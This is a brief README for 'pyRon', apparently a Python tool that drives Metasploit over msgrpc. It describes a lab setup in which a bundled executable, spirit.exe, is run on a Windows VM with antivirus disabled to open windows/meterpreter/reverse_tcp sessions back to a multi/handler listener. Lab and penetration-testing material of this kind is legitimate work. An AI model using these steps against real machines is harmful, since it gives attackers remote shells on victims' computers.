# A How To!

## Testing Environment...
 + The testing environment I am using to attack is Windows 10 Pro x64 on a VM with no AV enabled.
 + Metasploit and the Python script is running on Ubuntu 18.04

## Metasploit
 + Established a database by either running msfconsole for the first time or msfdb reinit just to clear out old info.
 + Running elevated msfconsole
 + In the console, you load msgrpc with a parameter of Pass=password

## Running pyRon
 + Runs on Python 2.7
 + Will run you through settings you need to setup
 + You can hit enter for defaults.
     - Depends on how you setup msgrpc
### Client Setup
 + Settings I used to setup the client:
     - username: msf (default)
     - password: password
     - port: 55552
     - host: 127.0.0.1 (default)
     - SSL: False
### Running a exploit
 + There is an exe in this folder called spirit.exe
     - This exe has a detectable payload. Please disable AV in order for this to work.
 + Copy the exe to a Windows OS
 + Run the pyRon
 + Select option 1
     - For the exploit type exploit/multi/handler
     - For the payload type windows/meterpreter/reverse_tcp
     - For LHOST please select the ip of your computer
     - For LPORT I used 4444 but I assume you can use any open port
     - Select the number of threads. I use 20 in my example.
 + Then it will sleep in order for you to execute the exe on the Windows machine.
 + It will then loop to the main menu where you can print all of the sessions available.
